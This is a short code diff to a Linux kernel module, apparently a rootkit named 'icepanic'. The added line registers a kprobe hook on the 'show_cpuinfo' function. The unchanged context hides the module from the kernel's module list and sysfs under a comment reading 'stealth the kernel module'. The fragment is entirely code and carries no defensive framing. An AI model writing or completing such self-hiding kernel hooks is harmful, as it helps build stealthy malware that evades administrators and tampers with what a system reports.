@@ -23,6 +23,7 @@ static int __init icepanic_init(void)
     // kprobe reg cpuinfo
     kp.symbol_name = "show_cpuinfo";
     kp.pre_handler = handler_pre;
+    register_kprobe(&kp);
     // stealth the kernel module
     list_del(&this_module->list);
     kobject_del(&this_module->mkobj.kobj);
